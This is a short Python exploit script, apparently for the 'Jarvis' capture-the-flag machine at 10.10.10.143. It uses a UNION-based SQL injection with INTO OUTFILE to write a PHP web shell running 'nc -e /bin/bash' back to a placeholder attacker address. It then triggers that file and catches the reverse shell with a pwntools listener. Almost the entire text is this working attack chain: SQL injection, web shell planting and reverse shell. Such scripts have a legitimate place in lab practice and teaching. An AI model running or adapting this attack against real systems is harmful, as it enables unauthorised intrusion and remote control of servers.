#!/usr/bin/python3

import requests
import pdb #Debugging
import sys
import signal
import time
import threading

from pwn import *

def def_handler(sig, frame):
    print("\n[!] Exiting the python script exploit_jarvis.py...\n")
    sys.exit(1)

#CTRL + C
signal.signal(signal.SIGINT, def_handler)

# GLOBAL VARIABLES
create_file = '''http://10.10.10.143/room.php?cod=-1 union select 1,2,"<?php system('nc -e /bin/bash 10.10.X.X 443'); ?>",4,5,6,7 into outfile "/var/www/html/reverse.php"-- -'''
exec_file = "http://10.10.10.143/reverse.php"
lport = 443

def makeRequest():
    r = requests.get(create_file)
    r = requests.get(exec_file)

if __name__ == '__main__':

    try:
        threading.Thread(target=makeRequest, args=()).start()
    except Exception as e:
        log.error(str(e))

    shell = listen(lport, timeout=20).wait_for_connection()
    shell.interactive()
